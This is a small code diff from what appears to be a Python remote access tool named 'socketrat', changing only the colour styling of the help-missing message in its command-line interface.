@@ -89,7 +89,7 @@ class ThreadingRATServer(socketserver.ThreadingMixIn, RATServer):
 class RATServerCmd(cmd.Cmd):
     prompt = '(socketrat) '
     ruler = '-'
-    nohelp = '*** {}'.format(Fore.RED + 'No help on %s' + Fore.RESET)
+    nohelp = '*** {}'.format(Style.BRIGHT + Fore.RED + 'No help on %s' + Style.RESET_ALL)
 
     def __init__(self, server, *args, **kwargs):
         super().__init__(*args, **kwargs)
